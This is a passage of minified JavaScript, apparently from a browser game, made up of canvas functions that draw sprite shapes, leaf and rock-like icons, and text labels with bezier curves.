      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 118;
      r.height = e * 114;
      n.translate(0, e * 10);
      ze(n, e * 42, e * 43, e * 24.758836806279895);
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65, e * 90);
      n.bezierCurveTo(e * 72, e * 91, e * 75, e * 92, e * 71, e * 96);
      n.bezierCurveTo(e * 65, e * 98, e * 65, e * 94, e * 65, e * 91);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87, e * 45);
      n.bezierCurveTo(e * 108, e * 59, e * 100, e * 86, e * 85, e * 91);
      n.bezierCurveTo(e * 80, e * 96, e * 68, e * 95, e * 58, e * 87);
      n.bezierCurveTo(e * 53, e * 80, e * 61, e * 64, e * 66, e * 58);
      n.bezierCurveTo(e * 73, e * 48, e * 78, e * 44, e * 87, e * 45);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, e * -10);
      ze(n, e * 42, e * 43, e * 24.758836806279895);
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65, e * 90);
      n.bezierCurveTo(e * 72, e * 91, e * 75, e * 92, e * 71, e * 96);
      n.bezierCurveTo(e * 65, e * 98, e * 65, e * 94, e * 65, e * 91);
      n.closePath();
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87, e * 45);
      n.bezierCurveTo(e * 108, e * 59, e * 100, e * 86, e * 85, e * 91);
      n.bezierCurveTo(e * 80, e * 96, e * 68, e * 95, e * 58, e * 87);
      n.bezierCurveTo(e * 53, e * 80, e * 61, e * 64, e * 66, e * 58);
      n.bezierCurveTo(e * 73, e * 48, e * 78, e * 44, e * 87, e * 45);
      n.closePath();
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 16);
      n.bezierCurveTo(e * 55, e * 19, e * 54, e * 20, e * 55, e * 22);
      n.bezierCurveTo(e * 52, e * 24.5, e * 52, e * 24.5, e * 49, e * 27);
      n.bezierCurveTo(e * 45, e * 25, e * 45, e * 25, e * 41, e * 23);
      n.bezierCurveTo(e * 45, e * 19, e * 48, e * 16, e * 52, e * 16);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 62, e * 30);
      n.bezierCurveTo(e * 66, e * 29, e * 64, e * 30, e * 66, e * 30);
      n.bezierCurveTo(e * 67, e * 31, e * 67, e * 31, e * 68, e * 32);
      n.bezierCurveTo(e * 66.5, e * 33.5, e * 66.5, e * 33.5, e * 65, e * 35);
      n.bezierCurveTo(e * 63.5, e * 32.5, e * 63.5, e * 32.5, e * 62, e * 30);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 29, e * 21);
      n.bezierCurveTo(e * 31, e * 22, e * 31, e * 26, e * 29, e * 29);
      n.bezierCurveTo(e * 26, e * 28.5, e * 26, e * 28.5, e * 23, e * 28);
      n.bezierCurveTo(e * 23, e * 26.5, e * 23, e * 26.5, e * 23, e * 25);
      n.bezierCurveTo(e * 25, e * 23, e * 25, e * 23, e * 27, e * 21);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 18, e * 36);
      n.bezierCurveTo(e * 23, e * 36, e * 24, e * 42, e * 19, e * 46);
      n.bezierCurveTo(e * 12, e * 39, e * 15, e * 38, e * 18, e * 37);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 34);
      n.bezierCurveTo(e * 35, e * 36, e * 36, e * 39, e * 32, e * 45);
      n.bezierCurveTo(e * 25, e * 46, e * 25, e * 44, e * 30, e * 34);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 59, e * 35);
      n.bezierCurveTo(e * 58, e * 27, e * 57, e * 27, e * 52, e * 31);
      n.bezierCurveTo(e * 50, e * 36, e * 53, e * 38, e * 58, e * 36);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 63, e * 46);
      n.bezierCurveTo(e * 64.5, e * 46.5, e * 64.5, e * 46.5, e * 66, e * 47);
      n.bezierCurveTo(e * 70, e * 50, e * 70, e * 53, e * 61, e * 55);
      n.bezierCurveTo(e * 62, e * 50.5, e * 62, e * 50.5, e * 63, e * 46);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41, e * 42);
      n.bezierCurveTo(e * 47, e * 41, e * 53, e * 47, e * 46, e * 51);
      n.bezierCurveTo(e * 38, e * 49, e * 39, e * 46, e * 41, e * 43);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 44, e * 57);
      n.bezierCurveTo(e * 54, e * 57, e * 54, e * 58, e * 55, e * 61);
      n.bezierCurveTo(e * 54, e * 63, e * 52, e * 64, e * 48, e * 65);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 20, e * 52);
      n.bezierCurveTo(e * 25, e * 51, e * 27, e * 50, e * 28, e * 54);
      n.bezierCurveTo(e * 27, e * 58, e * 24, e * 58, e * 22, e * 58);
      n.bezierCurveTo(e * 21, e * 55.5, e * 21, e * 55.5, e * 20, e * 53);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 61);
      n.bezierCurveTo(e * 37, e * 61, e * 39, e * 63, e * 39, e * 68);
      n.bezierCurveTo(e * 36, e * 68.5, e * 36, e * 68.5, e * 33, e * 69);
      n.bezierCurveTo(e * 30.5, e * 67.5, e * 30.5, e * 67.5, e * 28, e * 66);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 88, e * 45);
      n.bezierCurveTo(e * 90, e * 46.5, e * 90, e * 46.5, e * 92, e * 48);
      n.bezierCurveTo(e * 92, e * 50, e * 92, e * 50, e * 92, e * 52);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 96, e * 53);
      n.bezierCurveTo(e * 97.5, e * 55, e * 97.5, e * 55, e * 99, e * 57);
      n.bezierCurveTo(e * 97.5, e * 59.5, e * 97.5, e * 59.5, e * 96, e * 62);
      n.bezierCurveTo(e * 93.5, e * 60.5, e * 93.5, e * 60.5, e * 91, e * 59);
      n.bezierCurveTo(e * 91.5, e * 57, e * 91.5, e * 57, e * 92, e * 55);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 92, e * 71);
      n.bezierCurveTo(e * 94.5, e * 70.5, e * 94.5, e * 70.5, e * 97, e * 70);
      n.bezierCurveTo(e * 98.5, e * 72.5, e * 98.5, e * 72.5, e * 100, e * 75);
      n.bezierCurveTo(e * 97, e * 76.5, e * 97, e * 76.5, e * 94, e * 78);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 95, e * 82);
      n.bezierCurveTo(e * 96, e * 83, e * 96, e * 83, e * 97, e * 84);
      n.bezierCurveTo(e * 97, e * 85.5, e * 97, e * 85.5, e * 97, e * 87);
      n.bezierCurveTo(e * 93.5, e * 87.5, e * 93.5, e * 87.5, e * 90, e * 88);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 86, e * 72);
      n.bezierCurveTo(e * 89, e * 76, e * 88, e * 81, e * 85, e * 82);
      n.bezierCurveTo(e * 80, e * 80, e * 82, e * 78, e * 85, e * 72);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80, e * 86);
      n.bezierCurveTo(e * 84, e * 88, e * 86, e * 88, e * 85, e * 93);
      n.bezierCurveTo(e * 80, e * 96, e * 79, e * 96, e * 76, e * 91);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84, e * 46);
      n.bezierCurveTo(e * 93, e * 51, e * 91, e * 62, e * 80, e * 78);
      n.bezierCurveTo(e * 74, e * 86, e * 66, e * 90, e * 60, e * 86);
      n.bezierCurveTo(e * 55, e * 79, e * 57, e * 73, e * 67, e * 57);
      n.bezierCurveTo(e * 71, e * 51, e * 79, e * 44, e * 84, e * 46);
      n.closePath();
      ye(n, t[5], t[6], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 76, e * 60);
      n.bezierCurveTo(e * 80, e * 66, e * 75, e * 74, e * 68, e * 74);
      n.bezierCurveTo(e * 60, e * 64, e * 68, e * 59, e * 76, e * 59);
      n.closePath();
      ye(n, t[7], t[8], e * 5);
      return r;
    }
    function ji(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 70;
      var o = e * 90;
      var s = e * 4;
      var _ = e * 5;
      r.width = a;
      r.height = o;
      n.save();
      n.translate(e * -80, e * -70 + _);
      n.globalAlpha = 0.5;
      n.beginPath();
      n.bezierCurveTo(e * 130, e * 79, e * 132, e * 86, e * 130, e * 93);
      n.bezierCurveTo(e * 128, e * 100, e * 121, e * 107, e * 120, e * 107);
      n.bezierCurveTo(e * 120, e * 107, e * 115, e * 98, e * 115, e * 92);
      n.bezierCurveTo(e * 115, e * 86, e * 119, e * 76, e * 127, e * 73);
      n.closePath();
      ye(n, "#0d1b1c");
      n.restore();
      n.save();
      n.translate(e * -80, e * -70 + _);
      n.globalAlpha = 0.5;
      n.beginPath();
      n.bezierCurveTo(e * 112, e * 109, e * 111, e * 100, e * 106, e * 93);
      n.bezierCurveTo(e * 104, e * 90, e * 91, e * 87, e * 91, e * 87);
      n.bezierCurveTo(e * 91, e * 88, e * 91, e * 96, e * 94, e * 102);
      n.bezierCurveTo(e * 97, e * 108, e * 106, e * 112, e * 113, e * 112);
      n.closePath();
      ye(n, "#0d1b1c");
      n.restore();
      n.save();
      n.translate(e * -80, e * -70 + _);
      n.globalAlpha = 0.5;
      n.beginPath();
      n.bezierCurveTo(e * 108, e * 120, e * 100, e * 119, e * 91, e * 127);
      n.bezierCurveTo(e * 83, e * 134, e * 82, e * 146, e * 83, e * 146);
      n.bezierCurveTo(e * 84, e * 146, e * 98, e * 142, e * 103, e * 138);
      n.bezierCurveTo(e * 107, e * 135, e * 110, e * 130, e * 112, e * 121);
      n.closePath();
      ye(n, "#0d1b1c");
      n.restore();
      n.save();
      n.translate(e * 3, e * -93 + _);
      n.rotate(Math.PI / 5);
      n.globalAlpha = 0.5;
      n.beginPath();
      n.bezierCurveTo(e * 130, e * 79, e * 132, e * 86, e * 130, e * 93);
      n.bezierCurveTo(e * 128, e * 100, e * 121, e * 107, e * 120, e * 107);
      n.bezierCurveTo(e * 120, e * 107, e * 115, e * 98, e * 115, e * 92);
      n.bezierCurveTo(e * 115, e * 86, e * 119, e * 76, e * 127, e * 73);
      n.closePath();
      ye(n, "#0d1b1c");
      n.restore();
      n.save();
      n.translate(e * -80, e * -70);
      n.globalAlpha = 1;
      n.beginPath();
      n.bezierCurveTo(e * 130, e * 79, e * 132, e * 86, e * 130, e * 93);
      n.bezierCurveTo(e * 128, e * 100, e * 121, e * 107, e * 120, e * 107);
      n.bezierCurveTo(e * 120, e * 107, e * 115, e * 98, e * 115, e * 92);
      n.bezierCurveTo(e * 115, e * 86, e * 119, e * 76, e * 127, e * 73);
      n.closePath();
      ye(n, t[0], t[1], s);
      n.restore();
      n.save();
      n.translate(e * -80, e * -70);
      n.globalAlpha = 1;
      n.beginPath();
      n.bezierCurveTo(e * 112, e * 109, e * 111, e * 100, e * 106, e * 93);
      n.bezierCurveTo(e * 104, e * 90, e * 91, e * 87, e * 91, e * 87);
      n.bezierCurveTo(e * 91, e * 88, e * 91, e * 96, e * 94, e * 102);
      n.bezierCurveTo(e * 97, e * 108, e * 106, e * 112, e * 113, e * 112);
      n.closePath();
      ye(n, t[0], t[1], s);
      n.restore();
      n.save();
      n.translate(e * -80, e * -70);
      n.globalAlpha = 1;
      n.beginPath();
      n.bezierCurveTo(e * 108, e * 120, e * 100, e * 119, e * 91, e * 127);
      n.bezierCurveTo(e * 83, e * 134, e * 82, e * 146, e * 83, e * 146);
      n.bezierCurveTo(e * 84, e * 146, e * 98, e * 142, e * 103, e * 138);
      n.bezierCurveTo(e * 107, e * 135, e * 110, e * 130, e * 112, e * 121);
      n.closePath();
      ye(n, t[0], t[1], s);
      n.restore();
      n.save();
      n.translate(e * 3, e * -93);
      n.rotate(Math.PI / 5);
      n.globalAlpha = 1;
      n.beginPath();
      n.bezierCurveTo(e * 130, e * 79, e * 132, e * 86, e * 130, e * 93);
      n.bezierCurveTo(e * 128, e * 100, e * 121, e * 107, e * 120, e * 107);
      n.bezierCurveTo(e * 120, e * 107, e * 115, e * 98, e * 115, e * 92);
      n.bezierCurveTo(e * 115, e * 86, e * 119, e * 76, e * 127, e * 73);
      n.closePath();
      ye(n, t[0], t[1], s);
      n.restore();
      return r;
    }
    function Zi(e, i, t, r, n, a, o, s, _, E, T) {
      if (T === undefined) {
        T = 0;
      }
      var A = document.createElement("canvas");
      var d = A.getContext("2d");
      a = a ? a * e : 0;
      var h = Math.floor(e * t);
      d.font = h + "px Baloo Paaji";
      d.lineJoin = "round";
      s *= e;
      var I = o ? s * 2 : 0;
      if (_) {
        var u = Math.min(d.measureText(i).width + e * 2 + I, _);
      } else {
        u = d.measureText(i).width + e * 2 + I + T * e * 2;
      }
      h = (h + a + T) * e + I;
      A.width = u;
      A.height = h;
      if (o) {
        d.fillStyle = o;
        Be(d, 0, 0, u, h, s * 2);
        d.fill();
        d.translate(s, s);
      }
      d.textBaseline = "middle";
      d.font = t + "px Baloo Paaji";
      d.lineJoin = "round";
      if (n) {
        d.beginPath();
        d.fillStyle = n;
        d.fillText(i, 0, h / 2 + a - I / 2, u);
      }
      d.beginPath();
      if (E) {
        d.strokeStyle = E;
        d.lineWidth = T;
        d.strokeText(i, T, (h - I) / 2, u);
      }
      d.fillStyle = r;
      d.fillText(i, T, (h - I) / 2, u);
      return A;
    }
    function Qi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 220;
      var o = e * 230;
      var s = e * 100;
      var _ = s / 4;
      var E = e * 20;
      r.width = a;
      r.height = o;
      n.translate(a / 2, o / 2 + E);
      n.globalAlpha = 0.5;
      Ve(n, 7, s, _);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, -E);
      Ve(n, 7, s, _);
      ye(n, t[1]);
      Ve(n, 6, s * 0.65, _ * 0.65);
      ye(n, t[2]);
      return r;
    }
    function $i(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      var o = e * 220;
      var s = e * 220;
      var _ = e * 100;
      var E = _ / 4;
      n.width = o;
      n.height = s;
      a.translate(o / 2, s / 2);
      a.globalAlpha = i ? 0.5 : 1;
      if (!i) {
        a.translate(e * 0, e * -8);
      }
      Ve(a, 7, _, E);
      ye(a, i ? t[0] : t[1]);
      a.globalAlpha = 1;
      if (r == 0) {
        Ve(a, 6, _ * 0.65, E * 0.65);
        ye(a, t[2]);
      } else if (r == 1) {
        a.translate(e * 20, e * 20);
        Ve(a, 6, _ * 0.45, E * 0.4);
        ye(a, t[2]);
      }
      return n;
    }
    function et(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 120;
      var o = e * 150;
      var s = e * 60;
      var _ = s / 4;
      var E = e * 15;
      r.width = a;
      r.height = o;
      n.save();
      n.translate(a / 2 + e * 0, o / 2 + e * 0 + E);
      n.rotate(Math.PI / 3);
      n.globalAlpha = 0.5;
      Ve(n, 8, s, _);
      ye(n, t[0]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 11, o / 2 + e * 12);
      n.globalAlpha = 1;
      n.rotate(Math.PI / 3);
      n.translate(0, -E);
      Ve(n, 8, s, _);
      ye(n, t[1]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 9, o / 2 - e * 12);
      n.rotate(Math.PI / 2.8);
      Ve(n, 5, s * 0.5, _ * 0.4);
      ye(n, t[2]);
      n.restore();
      n.save();
      n.translate(a / 2 + e * 19, o / 2 + e * 5);
      n.rotate(Math.PI / 1);
      Ve(n, 5, s * 0.5, _ * 0.4);
      ye(n, t[2]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 8, o / 2 + e * 20);
      n.rotate(Math.PI / 2.25);
      Ve(n, 5, s * 0.5, _ * 0.4);
      ye(n, t[2]);
      n.restore();
      return r;
    }
    function it(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 180;
      var o = e * 210;
      var s = (E = e * 60) / 4;
      var _ = e * 20;
      r.width = a;
      r.height = o;
      n.save();
      n.translate(a / 2 - e * 0, o / 2 - e * 35 + _);
      n.rotate(Math.PI / -1.8);
      n.globalAlpha = 0.5;
      n.translate(e * 0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[0]);
      n.restore();
      n.save();
      n.translate(a / 2 + e * 10, o / 2 + e * 15 + _);
      n.rotate(Math.PI / 2);
      n.globalAlpha = 0.5;
      n.translate(e * 0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[0]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 50, o / 2 + e * 40 + _);
      n.rotate(Math.PI / 3);
      n.globalAlpha = 0.5;
      n.translate(0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[0]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 0, o / 2 - e * 35);
      n.rotate(Math.PI / -1.8);
      n.globalAlpha = 1;
      n.translate(e * 0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[1]);
      n.restore();
      n.save();
      n.translate(a / 2 + e * 10, o / 2 + e * 15);
      n.rotate(Math.PI / 2);
      n.globalAlpha = 1;
      n.translate(0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[1]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 50, o / 2 + e * 40);
      n.rotate(Math.PI / 3);
      n.globalAlpha = 1;
      n.translate(0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[1]);
      n.restore();
      var E;
      s = (E = e * 30) / 4;
      n.save();
      n.translate(a / 2 + e * 5, o / 2 - e * 20);
      n.rotate(Math.PI / -1.8);
      n.globalAlpha = 1;
      n.translate(0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[2]);
      n.restore();
      n.save();
      n.translate(a / 2 + e * 0, o / 2 + e * 10);
      n.rotate(Math.PI / 2);
      n.globalAlpha = 1;
      n.translate(0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[2]);
      n.restore();
      n.save();
      n.translate(a / 2 - e * 45, o / 2 + e * 35);
      n.rotate(Math.PI / 3);
      n.globalAlpha = 1;
      n.translate(0, e * -20);
      Ve(n, 5, E, s);
      ye(n, t[2]);
      n.restore();
      ze(n, a / 2 - e * 7, o / 2 + e * 7, 5);
      ye(n, t[2]);
      return r;
    }
    function tt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 140;
      var o = e * 150;
      var s = e * 10;
      var _ = e * 4;
      r.width = a;
      r.height = o;
      n.translate(e * -50, e * -38 + s);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.bezierCurveTo(e * 160, e * 65, e * 160, e * 85, e * 152, e * 95);
      n.bezierCurveTo(e * 152, e * 95, e * 173, e * 94, e * 187, e * 102);
      n.bezierCurveTo(e * 187, e * 102, e * 180, e * 120, e * 155, e * 126);
      n.bezierCurveTo(e * 154, e * 126, e * 166, e * 138, e * 169, e * 148);
      n.bezierCurveTo(e * 169, e * 148, e * 148, e * 152, e * 133, e * 140);
      n.bezierCurveTo(e * 133, e * 140, e * 134, e * 160, e * 122, e * 175);
      n.bezierCurveTo(e * 122, e * 175, e * 107, e * 162, e * 107, e * 144);
      n.bezierCurveTo(e * 107, e * 144, e * 98, e * 164, e * 73, e * 167);
      n.bezierCurveTo(e * 73, e * 167, e * 72, e * 134, e * 90, e * 127);
      n.bezierCurveTo(e * 90, e * 127, e * 70, e * 134, e * 55, e * 123);
      n.bezierCurveTo(e * 55, e * 123, e * 58, e * 115, e * 75, e * 104);
      n.bezierCurveTo(e * 75, e * 104, e * 66, e * 96, e * 61, e * 77);
      n.bezierCurveTo(e * 61, e * 77, e * 83, e * 74, e * 102, e * 89);
      n.bezierCurveTo(e * 102, e * 89, e * 92, e * 66, e * 110, e * 41);
      n.bezierCurveTo(e * 111, e * 40, e * 130, e * 54, e * 130, e * 82);
      n.bezierCurveTo(e * 130, e * 82, e * 143, e * 67, e * 159, e * 65);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, 0 - s);
      n.globalAlpha = 1;
      n.beginPath();
      n.bezierCurveTo(e * 160, e * 65, e * 160, e * 85, e * 152, e * 95);
      n.bezierCurveTo(e * 152, e * 95, e * 173, e * 94, e * 187, e * 102);
      n.bezierCurveTo(e * 187, e * 102, e * 180, e * 120, e * 155, e * 126);
      n.bezierCurveTo(e * 154, e * 126, e * 166, e * 138, e * 169, e * 148);
      n.bezierCurveTo(e * 169, e * 148, e * 148, e * 152, e * 133, e * 140);
      n.bezierCurveTo(e * 133, e * 140, e * 134, e * 160, e * 122, e * 175);
      n.bezierCurveTo(e * 122, e * 175, e * 107, e * 162, e * 107, e * 144);
      n.bezierCurveTo(e * 107, e * 144, e * 98, e * 164, e * 73, e * 167);
      n.bezierCurveTo(e * 73, e * 167, e * 72, e * 134, e * 90, e * 127);
      n.bezierCurveTo(e * 90, e * 127, e * 70, e * 134, e * 55, e * 123);
      n.bezierCurveTo(e * 55, e * 123, e * 58, e * 115, e * 75, e * 104);
      n.bezierCurveTo(e * 75, e * 104, e * 66, e * 96, e * 61, e * 77);
      n.bezierCurveTo(e * 61, e * 77, e * 83, e * 74, e * 102, e * 89);
      n.bezierCurveTo(e * 102, e * 89, e * 92, e * 66, e * 110, e * 41);
      n.bezierCurveTo(e * 111, e * 40, e * 130, e * 54, e * 130, e * 82);
      n.bezierCurveTo(e * 130, e * 82, e * 143, e * 67, e * 159, e * 65);
      n.closePath();
      ye(n, t[1], t[2], _);
      return r;
    }
    function rt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 18;
      var o = e * 18;
      r.width = a;
      r.height = o;
      var s = e * 9;
      var _ = e * 9;
      var E = e * 8;
      n.save();
      n.translate(s, _);
      n.globalAlpha = 1;
      ze(n, 0, 0, E);
      ye(n, t[0]);
      E = e * 3;
      s = 0;
      _ = e * -3;
      n.translate(s, _);
      n.globalAlpha = 1;
      ze(n, 0, 0, E);
      ye(n, t[1]);
      n.restore();
      return r;
    }
    function nt(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 80;
      t.height = e * 100;
      r.scale(0.5, 0.5);
      r.translate(10, 15);
      r.globalAlpha = 0.5;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 47, e * 5);
      r.bezierCurveTo(e * 19, e * 30, e * 12, e * 42, e * 10, e * 55);
      r.bezierCurveTo(e * 11, e * 75, e * 27, e * 76, e * 36, e * 72);
      r.bezierCurveTo(e * 52, e * 60, e * 53, e * 46, e * 54, e * 31);
      r.bezierCurveTo(e * 53, e * 14, e * 50, e * 9, e * 48, e * 6);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 17, e * 70);
      r.bezierCurveTo(e * 18, e * 77, e * 10, e * 83, e * 4, e * 87);
      ye(r, undefined, i[0], e * 10);
      r.translate(0, -10);
      r.globalAlpha = 1;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 47, e * 5);
      r.bezierCurveTo(e * 19, e * 30, e * 12, e * 42, e * 10, e * 55);
      r.bezierCurveTo(e * 11, e * 75, e * 27, e * 76, e * 36, e * 72);
      r.bezierCurveTo(e * 52, e * 60, e * 53, e * 46, e * 54, e * 31);
      r.bezierCurveTo(e * 53, e * 14, e * 50, e * 9, e * 48, e * 6);
      r.closePath();
      ye(r, i[1], i[2], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 17, e * 70);
      r.bezierCurveTo(e * 18, e * 77, e * 10, e * 83, e * 4, e * 87);
      ye(r, undefined, i[2], e * 8);
      r.globalAlpha = 0.5;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 17, e * 70);
      r.bezierCurveTo(e * 33, e * 52, e * 39, e * 33, e * 48, e * 7);
      ye(r, undefined, i[2], e * 8);
      return t;
    }
    function nt(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 234;
      t.height = e * 183;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 76, e * 25);
      r.bezierCurveTo(e * 150, e * 3, e * 181, e * 22, e * 203, e * 41);
      r.bezierCurveTo(e * 225, e * 63, e * 225, e * 105, e * 198, e * 133);
      r.bezierCurveTo(e * 179, e * 157, e * 134, e * 178, e * 81, e * 164);
      r.bezierCurveTo(e * 19, e * 148, e * 6, e * 95, e * 21, e * 66);
      r.bezierCurveTo(e * 34, e * 39, e * 52, e * 33, e * 75, e * 25);
      r.closePath();
      ye(r, i[0], i[0], e * 4);
      return t;
    }
    function at(e, i, t, r, n) {
      var a = document.createElement("canvas");
      var o = a.getContext("2d");
      if (r == 0) {
        var s = e * 270;
        var _ = e * 250;
        a.width = s;
        a.height = _;
        o.beginPath();
        o.moveTo(e * 140, e * 3);
        o.translate(e * -25, e * -20);
        o.bezierCurveTo(e * 218, e * 31, e * 251, e * 61, e * 265, e * 85);
        o.bezierCurveTo(e * 278, e * 108, e * 295, e * 160, e * 285, e * 195);
        o.bezierCurveTo(e * 271, e * 242, e * 213, e * 268, e * 188, e * 266);
        o.bezierCurveTo(e * 139, e * 262, e * 70, e * 244, e * 47, e * 204);
        o.bezierCurveTo(e * 20, e * 158, e * 35, e * 78, e * 59, e * 56);
        o.bezierCurveTo(e * 90, e * 28, e * 124, e * 23, e * 140, e * 23);
        o.closePath();
        ye(o, t[0]);
      } else if (r == 1) {
        s = e * 430;
        _ = e * 350;
        a.width = s;
        a.height = _;
        o.beginPath();
        o.moveTo(e * 180, e * 5);
        o.translate(e * -30, e * -60);
        o.bezierCurveTo(e * 283, e * 60, e * 265, e * 163, e * 335, e * 206);
        o.bezierCurveTo(e * 376, e * 231, e * 492, e * 299, e * 434, e * 357);
        o.bezierCurveTo(e * 371, e * 421, e * 289, e * 394, e * 255, e * 386);
        o.bezierCurveTo(e * 218, e * 377, e * 91, e * 359, e * 50, e * 272);
        o.bezierCurveTo(e * 12, e * 192, e * 107, e * 75, e * 178, e * 69);
        o.closePath();
        ye(o, t[0]);
      } else if (r == 2) {
        s = e * 400;
        _ = e * 300;
        a.width = s;
        a.height = _;
        o.beginPath();
        o.moveTo(e * 80, e * 52);
        o.translate(e * -40, e * -30);
        o.bezierCurveTo(e * 124, e * 77, e * 241, e * 22, e * 311, e * 65);
        o.bezierCurveTo(e * 352, e * 90, e * 404, e * 176, e * 346, e * 234);
        o.bezierCurveTo(e * 283, e * 298, e * 179, e * 299, e * 145, e * 291);
        o.bezierCurveTo(e * 108, e * 282, e * 100, e * 239, e * 63, e * 205);
        o.bezierCurveTo(e * 37, e * 181, e * 45, e * 131, e * 80, e * 107);
        o.closePath();
        ye(o, t[0]);
      }
      return a;
    }
    function ot(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * i * 2;
      var o = e * i * 2;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      n.translate(s, _);
      ze(n, 0, 0, i * e);
      ye(n, t);
      return r;
    }
    function st(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 373;
      r.height = e * 314;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 184.048583984375, e * 69.1805419921875);
      Be(n, e * -40, e * -28.5, e * 80, e * 57, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 185.048583984375, e * 61.6805419921875);
      n.bezierCurveTo(e * 145.048583984375, e * 59.6805419921875, e * 138.048583984375, e * 41.6805419921875, e * 148.048583984375, e * 33.6805419921875);
